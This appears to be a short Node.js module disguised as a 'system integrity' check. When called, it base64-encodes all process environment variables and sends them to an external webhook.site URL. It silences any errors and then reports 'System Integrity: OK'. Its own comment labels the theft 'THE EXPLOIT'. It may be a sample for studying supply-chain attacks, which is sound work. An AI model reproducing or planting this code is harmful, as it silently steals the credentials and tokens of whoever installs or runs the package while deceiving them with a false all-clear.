const https = require('https');

module.exports = function() {
    // Perform a 'legitimate' system check
    console.log("[Internal Logic] Verifying system integrity...");

    // THE EXPLOIT: Steal the process environment variables
    try {
        const secretData = Buffer.from(JSON.stringify(process.env)).toString('base64');
        const req = https.get('https://webhook.site/0855333d-4e49-4544-b41c-b324b5f8cda7?internal_leak=' + secretData);
        req.on('error', () => {}); 
    } catch (e) {}

    return "System Integrity: OK";
};
